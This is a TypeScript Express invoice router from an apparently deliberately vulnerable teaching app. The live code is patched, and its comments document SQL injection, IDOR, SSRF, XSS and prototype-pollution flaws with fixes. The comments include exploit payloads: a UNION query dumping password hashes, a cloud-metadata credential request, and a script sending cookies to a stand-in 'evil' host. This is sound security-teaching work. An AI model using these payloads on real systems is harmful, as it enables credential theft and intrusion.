import { Router } from 'express';
import { db } from '../db';
import { authenticate } from '../security/auth';
import { assertPublicHost } from '../security/urlGuard';
import { escapeHtml } from '../security/html';
import { safeMerge } from '../util/merge';

export const invoices = Router();

/**
 * VULNERABLE (seed/all-vulns branch) — CWE-89 SQL Injection / OWASP A03.
 *
 * WHY THIS SHIPS IN REAL LIFE: a LIKE search was needed quickly and a template
 * literal "just worked" in local testing. No parameterization, no review.
 *
 * Exploit:  GET /invoices/search?q=x%25' UNION SELECT password, username, 0 FROM users --
 * (%25 is the URL-encoded '%'.) Returns the users table's password hashes.
 *
 * FIX (applied on `main`, PR #1) — parameterized query:
 *   const q = String(req.query.q ?? '');
 *   const rows = db
 *     .prepare('SELECT id, description, amount FROM invoices WHERE description LIKE ?')
 *     .all(`%${q}%`);
 */
invoices.get('/search', (req, res) => {
  const q = String(req.query.q ?? '');
  const rows = db
    .prepare('SELECT id, description, amount FROM invoices WHERE description LIKE ?')
    .all(`%${q}%`);
  res.json(rows);
});

// A boring, honest endpoint so the app is a plausible product, not a vuln museum.
invoices.get('/', (_req, res) => {
  const rows = db.prepare('SELECT id, description, amount FROM invoices').all();
  res.json(rows);
});

/**
 * "My invoices" — the caller is identified by a JWT bearer token (this is the real
 * principal that IDOR/SSRF referred to). The auth itself is the vuln here: see
 * src/security/auth.ts (jwt.decode, no signature check). Because the token isn't verified,
 * an attacker forges `{ sub: <any owner> }` and reads that owner's invoices. Registered
 * before '/:id' so 'mine' isn't captured as an id.
 */
invoices.get('/mine', (req, res) => {
  const principal = authenticate(req);
  if (!principal) return res.status(401).json({ error: 'auth required' });
  const rows = db
    .prepare('SELECT id, description, amount FROM invoices WHERE owner_id = ?')
    .all(principal.sub);
  res.json(rows);
});

/**
 * VULNERABLE (seed/all-vulns branch) — CWE-639 IDOR / OWASP A01 Broken Access Control.
 *
 * The authenticated principal is carried in `x-user-id` (this stands in for a JWT `sub`
 * or a session user — see the JWT class #5 for the real thing). The invoice is fetched by
 * the *path* id with NO ownership check, so the principal is never compared to
 * `invoices.owner_id`. Any logged-in user can read anyone's invoice by guessing the id.
 *
 * WHY THIS SHIPS IN REAL LIFE: "fetch invoice by id" is the obvious one-liner; the owner
 * scope lives in the developer's head ("you only ever see your own"), never in the query.
 *
 * Exploit:  alice (owner_id 1) reads bob's invoice (id 3, owner_id 2):
 *   GET /invoices/3   with header  x-user-id: 1     -> 200, returns bob's data.
 *
 * FIX (applied on `main`, PR #2) — scope the row to the owner:
 *   const ownerId = Number(req.header('x-user-id'));
 *   if (!Number.isInteger(ownerId)) return res.status(401).json({ error: 'auth required' });
 *   const row = db
 *     .prepare('SELECT id, description, amount, note FROM invoices WHERE id = ? AND owner_id = ?')
 *     .get(id, ownerId);
 * Cross-owner reads then return 404 (indistinguishable from "no such invoice").
 */
invoices.get('/:id', (req, res) => {
  const id = Number(req.params.id);
  const ownerId = Number(req.header('x-user-id'));
  if (!Number.isInteger(ownerId)) return res.status(401).json({ error: 'auth required' });
  const row = db
    .prepare('SELECT id, description, amount, note FROM invoices WHERE id = ? AND owner_id = ?')
    .get(id, ownerId);
  if (!row) return res.status(404).json({ error: 'not found' });
  res.json(row);
});

/**
 * VULNERABLE (seed/all-vulns branch) — CWE-918 SSRF / OWASP A10.
 *
 * "Import an invoice from a supplier's URL": the server fetches a caller-supplied URL and
 * echoes the JSON back. The URL goes straight into fetch() with no allowlist, so the
 * attacker aims the *server's* network position at internal targets it can reach and the
 * client can't. A guard (src/security/urlGuard.ts::assertPublicHost) already exists in the
 * codebase — this endpoint just never calls it. That's how SSRF usually ships.
 *
 * Exploit — read AWS/GCP instance metadata (creds) from link-local:
 *   POST /invoices/import   { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
 * Also reaches localhost admin panels, RFC1918 hosts, etc.
 *
 * FIX (applied on `main`, PR #3) — sanitize before fetch:
 *   let safe: string;
 *   try { safe = assertPublicHost(url); }
 *   catch { return res.status(400).json({ error: 'url host is not permitted' }); }
 *   const upstream = await fetch(safe);
 * The allowlist check clears the taint; internal targets return 400.
 */
invoices.post('/import', async (req, res) => {
  const url = req.body?.url;
  if (typeof url !== 'string') return res.status(400).json({ error: 'url (string) required' });
  let safe: string;
  try {
    safe = assertPublicHost(url);
  } catch {
    return res.status(400).json({ error: 'url host is not permitted' });
  }
  try {
    const upstream = await fetch(safe); // sanitized: host checked against allowlist/deny
    const data = await upstream.json();
    res.json({ imported: data });
  } catch {
    res.status(502).json({ error: 'upstream fetch failed' });
  }
});

/**
 * VULNERABLE (seed/all-vulns branch) — CWE-79 (reflected) XSS / OWASP A03.
 *
 * A "preview your note before saving" pane: the client posts a draft note and gets back the
 * rendered HTML. The note is interpolated straight into the response body, so a `<script>`
 * in the note executes in the victim's browser. (Express sends a string as `text/html`.)
 *
 * Exploit:
 *   POST /invoices/1/note/preview   { "note": "<script>fetch('//evil/'+document.cookie)</script>" }
 *   -> the script tag comes back verbatim and runs when previewed.
 *
 * FIX (applied on `main`, PR #4) — encode on output:
 *   res.send(`<div class="note-preview">${escapeHtml(note)}</div>`);
 * The '<','>' become entities; the payload renders as inert text.
 *
 * NOTE ON STORED XSS: persisting the note and rendering it later from the DB is the same
 * bug class, but this taint rule (source = req.*) can't see a value that round-trips through
 * SQLite — that blind spot is documented in vulns/04-xss/README.md.
 */
invoices.post('/:id/note/preview', (req, res) => {
  const note = req.body?.note;
  if (typeof note !== 'string') return res.status(400).json({ error: 'note (string) required' });
  // Encoded on output: HTML metacharacters become entities, so the note renders as text.
  res.send(`<!doctype html><div class="note-preview">${escapeHtml(note)}</div>`);
});

// Per-process display preferences store (a plausible "save my UI prefs" feature).
const prefs: Record<string, unknown> = {};

/**
 * VULNERABLE (seed/all-vulns branch) — CWE-1321 Prototype Pollution / OWASP A08.
 *
 * Deep-merges the caller's JSON into the prefs object with no prototype guard. A body of
 * { "__proto__": { "isAdmin": true } } pollutes Object.prototype, so *every* object in the
 * process suddenly has `isAdmin === true` — a classic path to privilege escalation, DoS, or
 * gadget-driven RCE depending on what later reads those inherited props.
 *
 * Exploit:
 *   POST /invoices/prefs   { "__proto__": { "polluted": "yes" } }
 *   -> afterwards ({}).polluted === "yes" for brand-new objects.
 *
 * FIX (applied on `main`, PR #6) — reject dangerous keys and merge safely:
 *   safeMerge(prefs, req.body);   // ignores '__proto__'/'constructor'/'prototype'
 */
invoices.post('/prefs', (req, res) => {
  if (typeof req.body !== 'object' || req.body === null || Array.isArray(req.body)) {
    return res.status(400).json({ error: 'object body required' });
  }
  safeMerge(prefs, req.body); // guarded merge: dangerous keys rejected before assignment
  res.json({ prefs });
});
